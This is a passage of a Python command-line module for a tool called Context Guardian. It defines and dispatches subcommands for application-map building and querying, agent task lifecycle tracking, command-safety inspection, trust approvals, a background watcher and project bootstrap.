    check_map_parser = subparsers.add_parser(
        "check-map", help="check application map freshness and health"
    )
    check_map_parser.add_argument("--project", required=True, type=Path)
    check_map_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)

    refresh_map_parser = subparsers.add_parser(
        "refresh-map", help="incrementally refresh an application map"
    )
    refresh_map_parser.add_argument("--project", required=True, type=Path)
    refresh_map_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)
    refresh_map_parser.add_argument("--output", type=Path, default=MAP_RELATIVE_PATH)
    refresh_map_parser.add_argument("--path", action="append", default=None)

    query_map_parser = subparsers.add_parser(
        "query-map", help="query a bounded application-map neighborhood"
    )
    query_map_parser.add_argument("--project", required=True, type=Path)
    query_map_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)
    query_map_parser.add_argument("--path", action="append", default=[])
    query_map_parser.add_argument("--symbol", action="append", default=[])

    impact_map_parser = subparsers.add_parser(
        "impact-map", help="traverse a bounded transitive application impact graph"
    )
    impact_map_parser.add_argument("--project", required=True, type=Path)
    impact_map_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)
    impact_map_parser.add_argument("--path", action="append", default=[])
    impact_map_parser.add_argument("--symbol", action="append", default=[])
    impact_map_parser.add_argument("--depth", type=int, default=3)
    impact_map_parser.add_argument(
        "--direction",
        choices=("dependents", "dependencies", "both"),
        default="dependents",
    )
    impact_map_parser.add_argument("--edge-kind", action="append", default=None)

    begin_parser = subparsers.add_parser("begin", help="begin task lifecycle and record baseline")
    begin_parser.add_argument("--project", required=True, type=Path)
    begin_parser.add_argument("--runtime", help="agent runtime identifier")
    begin_parser.add_argument("--session", dest="session_id", help="runtime session ID")
    begin_parser.add_argument("--turn", dest="turn_id", help="runtime turn ID")

    status_parser = subparsers.add_parser("status", help="check task lifecycle run status")
    status_parser.add_argument("--project", required=True, type=Path)
    status_parser.add_argument("--run", dest="run_id", required=True, help="run ID")

    finish_parser = subparsers.add_parser("finish", help="finish task lifecycle and evaluate completion")
    finish_parser.add_argument("--project", required=True, type=Path)
    finish_parser.add_argument("--run", dest="run_id", required=True, help="run ID")
    finish_parser.add_argument("--max-retries", type=int, default=DEFAULT_MAX_RETRIES)
    finish_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)
    finish_parser.add_argument(
        "--validation-level",
        choices=("quick", "full", "all"),
        default="quick",
        help="validation planning level",
    )

    abort_parser = subparsers.add_parser("abort", help="abort task lifecycle run")
    abort_parser.add_argument("--project", required=True, type=Path)
    abort_parser.add_argument("--run", dest="run_id", required=True, help="run ID")
    abort_parser.add_argument("--reason", help="reason for aborting")

    inspect_safety_parser = subparsers.add_parser(
        "inspect-safety", help="inspect validation command safety and risk classification"
    )
    inspect_safety_parser.add_argument("--command", dest="target_command", help="single command string to inspect")
    inspect_safety_parser.add_argument("--project", type=Path, help="optional project path to inspect profile commands")

    trust_parser = subparsers.add_parser(
        "trust",
        help="approve a project command to run without asking, on this machine only (never stored in the repository)",
    )
    trust_parser.add_argument("--project", required=True, type=Path)
    trust_action = trust_parser.add_mutually_exclusive_group(required=True)
    trust_action.add_argument("--command", dest="trust_command", help="command to approve, exactly as the profile lists it")
    trust_action.add_argument("--remove", dest="untrust_command", help="withdraw an approval")
    trust_action.add_argument("--list", action="store_true", help="show approved and requested commands")

    preflight_intent_parser = subparsers.add_parser(
        "preflight-intent", help="route natural language task intent to features before making edits"
    )
    preflight_intent_parser.add_argument("--project", required=True, type=Path)
    preflight_intent_parser.add_argument("--intent", required=True, help="natural language task intent or user prompt")
    preflight_intent_parser.add_argument("--map", dest="map_path", type=Path, default=MAP_RELATIVE_PATH)
    preflight_intent_parser.add_argument(
        "--validation-level",
        choices=("quick", "full", "all"),
        default="quick",
        help="validation planning level",
    )

    check_twins_parser = subparsers.add_parser(
        "check-twins", help="check cross-platform twin synchronization"
    )
    check_twins_parser.add_argument("--project", required=True, type=Path)
    check_twins_parser.add_argument("--path", action="append", default=None)

    watch_parser = subparsers.add_parser(
        "watch",
        help="run the background watcher until interrupted (detection outside the agent)",
    )
    watch_parser.add_argument("--project", required=True, type=Path)
    watch_parser.add_argument("--interval", type=float, default=DEFAULT_WATCH_INTERVAL)
    watch_parser.add_argument(
        "--iterations", type=int, default=None, help="stop after N scans (testing)"
    )
    watch_parser.add_argument("--map-path", type=Path, default=MAP_RELATIVE_PATH)

    scan_parser = subparsers.add_parser(
        "scan", help="run one watcher pass now and queue new findings"
    )
    scan_parser.add_argument("--project", required=True, type=Path)

    watch_status_parser = subparsers.add_parser(
        "watch-status", help="report whether a watcher is running for this project"
    )
    watch_status_parser.add_argument("--project", required=True, type=Path)

    findings_parser = subparsers.add_parser(
        "findings", help="hand over queued findings; silent when there are none"
    )
    findings_parser.add_argument("--project", required=True, type=Path)
    findings_parser.add_argument(
        "--peek",
        action="store_true",
        help="show pending findings without marking them delivered",
    )

    bootstrap_parser = subparsers.add_parser(
        "bootstrap", help="bootstrap application profile, map, and runtime hooks"
    )
    bootstrap_parser.add_argument("--project", required=True, type=Path)
    bootstrap_parser.add_argument("--app-id", help="application ID")
    bootstrap_parser.add_argument("--display-name", help="display name")
    bootstrap_parser.add_argument("--no-hooks", action="store_true", help="skip installing runtime hooks")

    upgrade_parser = subparsers.add_parser(
        "upgrade",
        help="update an onboarded project's managed Context Guardian files to this version",
    )
    upgrade_parser.add_argument("--project", required=True, type=Path)
    upgrade_parser.add_argument("--dry-run", action="store_true", help="report planned changes without writing")
    upgrade_parser.add_argument("--no-map", action="store_true", help="leave the generated map to the next finish")

    # Parsed by their own modules; listed here so they appear in --help.
    subparsers.add_parser(
        "hook",
        help="runtime hook entry point for Claude Code and Gemini CLI (reads the event from stdin)",
        add_help=False,
    )
    for name, text in MACHINE_COMMANDS.items():
        subparsers.add_parser(name, help=text, add_help=False)

    return parser


MACHINE_COMMANDS = {
    "install": "make the skill available to the agents on this machine (asks first)",
    "uninstall": "remove what install created; --project also cleans an application",
    "doctor": "check the installation and the current application",
}


def _run_hook(argv: list[str]) -> int:
    try:
        from . import runtime_connector
    except ImportError:  # run as a script from a clone, not as the installed package
        import runtime_connector
    return runtime_connector.main(argv)


def _run_installer(argv: list[str]) -> int:
    try:
        from . import installer
    except ImportError:  # run as a script from a clone, not as the installed package
        import installer
    return installer.main(argv)


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    if argv[:1] == ["hook"]:
        return _run_hook(argv[1:])
    if argv[:1] and argv[0] in MACHINE_COMMANDS:
        return _run_installer(argv)
    args = build_parser().parse_args(argv)
    # `inspect-safety --command` takes no project; every other command requires one.
    project = args.project.expanduser().resolve() if getattr(args, "project", None) else None
    try:
        if args.command == "build-map":
            map_data = build_application_map(project)
            destination = write_application_map(project, map_data, args.output)
            result = {
                "status": "ok",
                "map": str(destination),
                **map_data["summary"],
                "project_content_sha256": map_data["project_content_sha256"],
            }
        elif args.command == "check-map":
            map_data = load_application_map(project, args.map_path)
            freshness = check_map_freshness(project, map_data)
            map_file = (
                (project / args.map_path).resolve()
                if not args.map_path.is_absolute()
                else args.map_path.resolve()
            )
            node_ids = {n["id"] for n in map_data["nodes"]}
            result = {
                "status": "ok",
                "map": str(map_file),
                "freshness": freshness,
                "summary": map_data.get("summary", {}),
                "gap_count": len(map_data.get("coverage_gaps", [])),
                "reference_integrity": {
                    "dangling_edge_count": sum(
                        edge.get("from") not in node_ids
                        or (edge.get("to") not in node_ids and not (
                            edge.get("kind") == "imports" and edge.get("resolved") is False
                            and str(edge.get("to", "")).startswith("module:")))
                        for edge in map_data["edges"]),
                    "unresolved_module_import_count": sum(
                        edge.get("kind") == "imports" and edge.get("resolved") is False
                        and str(edge.get("to", "")).startswith("module:")
                        for edge in map_data["edges"]),
                    "missing_source_count": sum(
                        not (project / n["path"]).is_file()
                        for n in map_data["nodes"] if n.get("kind") == "file"
                        and _safe_repository_path(project, n.get("path", ""))),
                },
            }
        elif args.command == "refresh-map":
            existing_map = load_application_map(project, args.map_path)
            refreshed = refresh_application_map(project, existing_map, changed_paths=args.path)
            destination = write_application_map(project, refreshed, args.output)
            result = {
                "status": "ok",
                "map": str(destination),
                **refreshed["summary"],
                "project_content_sha256": refreshed["project_content_sha256"],
            }
        elif args.command in {"query-map", "impact-map"}:
            map_data = load_application_map(project, args.map_path)
            if args.command == "query-map":
                result = query_application_map(
                    map_data, paths=args.path, symbols=args.symbol
                )
            else:
                result = impact_application_map(
                    map_data,
                    paths=args.path,
                    symbols=args.symbol,
                    depth=args.depth,
                    direction=args.direction,
                    edge_kinds=args.edge_kind,
                )
        elif args.command == "validate-profile":
            profile = load_profile(project)
            result = {
                "status": "ok",
                "app_id": profile["app_id"],
                "schema_version": SUPPORTED_SCHEMA_VERSION,
            }
        elif args.command == "begin":
            result = begin_run(
                project,
                runtime=args.runtime,
                session_id=args.session_id,
                turn_id=args.turn_id,
            )
        elif args.command == "status":
            result = get_run_status(project, args.run_id)
        elif args.command == "finish":
            result = finish_run(
                project,
                args.run_id,
                max_retries=args.max_retries,
                map_path=args.map_path,
                validation_level=getattr(args, "validation_level", "quick"),
            )
        elif args.command == "watch":
            result = watch_project(
                project,
                interval=args.interval,
                iterations=args.iterations,
                map_path=args.map_path,
            )
        elif args.command == "scan":
            result = scan_once(project)
        elif args.command == "watch-status":
            result = {"status": "ok", **watcher_state(project)}
        elif args.command == "findings":
            result = drain_findings(project, mark=not args.peek)
        elif args.command == "trust":
            if args.list:
                try:
                    requested = sorted(requested_trusted_commands(load_profile(project)))
                except ProfileError:
                    requested = []
                approved = sorted(trusted_commands(None, project))
                result = {
                    "status": "ok",
                    "project": str(project),
                    "store": str(trust_store_path()),
                    "approved": approved,
                    "requested_not_approved": [c for c in requested if c not in approved],
                }
            elif args.trust_command:
                result = set_command_trust(project, args.trust_command, True)
            else:
                result = set_command_trust(project, args.untrust_command, False)
        elif args.command == "abort":
            result = abort_run(project, args.run_id, reason=args.reason)
        elif args.command == "inspect-safety":
            if getattr(args, "target_command", None):
                profile = None
                if project is not None:
                    try:
                        profile = load_profile(project)
                    except ProfileError:
                        profile = None
                result = command_safety(args.target_command, profile, project)
            elif getattr(args, "project", None):
                profile = load_profile(args.project.expanduser().resolve())
                commands_to_check: list[dict[str, Any]] = []
                cmds = profile.get("commands", {}) if isinstance(profile.get("commands"), dict) else {}
                for q in cmds.get("quick", []):
                    commands_to_check.append({"source": "global-quick", "level": "quick", **command_safety(q, profile, project)})
                for f in cmds.get("full", []):
                    commands_to_check.append({"source": "global-full", "level": "full", **command_safety(f, profile, project)})
                for feat in profile.get("features", []):
                    for v in feat.get("validation", []):
                        commands_to_check.append({"source": f"feature:{feat['id']}", "level": "feature", **command_safety(v, profile, project)})
                result = {
                    "status": "ok",
                    "app_id": profile["app_id"],
                    "inspected_count": len(commands_to_check),
                    "disallowed_count": len([c for c in commands_to_check if c["tier"] == "disallowed"]),
                    "requires_approval_count": len([c for c in commands_to_check if c["tier"] == "requires-approval"]),
                    "safe_count": len([c for c in commands_to_check if c["tier"] == "safe"]),
                    "commands": commands_to_check,
                }
            else:
                raise ProfileError("either --command or --project must be specified")
        elif args.command == "preflight-intent":
            profile = load_profile(project)
            map_data = None
            map_path = args.map_path
            target_map = (
                (project / map_path).resolve()
                if not map_path.is_absolute()
                else map_path.resolve()
            )
            if target_map.is_file():
                try:
                    map_data = load_application_map(project, map_path)
                except MapError:
                    pass
            result = route_task_intent(
                project,
                profile,
                args.intent,
                map_data=map_data,
                validation_level=getattr(args, "validation_level", "quick"),
            )
        elif args.command == "check-twins":
            profile = None
            try:
                profile = load_profile(project)
            except ProfileError:
                pass
            target_files = args.path if args.path else changed_files(project, None)
            result = analyze_twin_synchronization(project, target_files, profile)
        elif args.command == "upgrade":
            result = upgrade_project(
                project,
                dry_run=args.dry_run,
                refresh_map=not args.no_map,
            )
        elif args.command == "bootstrap":
            result = bootstrap_project(
                project,
                app_id=getattr(args, "app_id", None),
                display_name=getattr(args, "display_name", None),
                setup_hooks=not getattr(args, "no_hooks", False),
            )
        else:
            profile = load_profile(project)
            files = changed_files(project, args.base)
            map_data = None
            map_status = "skipped" if getattr(args, "no_map", False) else "not-found"
            if not getattr(args, "no_map", False):
                map_path = args.map_path
                target_map = (
                    (project / map_path).resolve()
                    if not map_path.is_absolute()
                    else map_path.resolve()
                )
                if target_map.is_file():
                    try:
                        map_data = load_application_map(project, map_path)
                        map_status = "loaded"
                    except MapError:
                        map_status = "error"
            result = compact_report(
                project,
                profile,
                files,
                map_data=map_data,
                map_status=map_status,
                depth=args.depth,
                validation_level=getattr(args, "validation_level", "quick"),
            )
    except (ProfileError, MapError, LifecycleError) as exc:
        print(
            json.dumps(
                {"status": "error", "error": str(exc)},
                ensure_ascii=False,
                separators=(",", ":"),
            )
        )
        return 2

    print(json.dumps(result, ensure_ascii=False, separators=(",", ":")))
    return 0


if __name__ == "__main__":
    sys.exit(main())
